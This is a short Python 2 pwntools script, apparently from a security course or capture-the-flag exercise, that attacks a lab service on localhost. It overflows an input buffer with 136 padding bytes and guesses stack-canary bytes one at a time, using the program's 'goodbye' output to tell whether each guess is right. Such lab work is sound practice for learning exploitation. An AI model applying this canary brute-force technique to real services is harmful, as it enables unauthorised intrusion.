#!/usr/bin/env python2

from pwn import *
import time
import struct

PADDING = 136
canary = [0x00]

#challenge-specific info
host = 'localhost'
port = 8000
netid='pk1898'
r = remote(host, port)
currentByte = 0x00
nextByte = 0xAF
print r.recvuntil("First, how long is your name?")
size = str(PADDING + 2)
print size
print r.sendline(size)
print r.recvuntil("of data")
DATA = "A" * PADDING
DATA += struct.pack("B", currentByte)
DATA += struct.pack("B", nextByte)
print DATA
r.sendline(DATA)
# print r.recvline()
received = r.recvuntil("and goodbye!")
print received
if "and goodbye!" in received:
    print "it's there!!"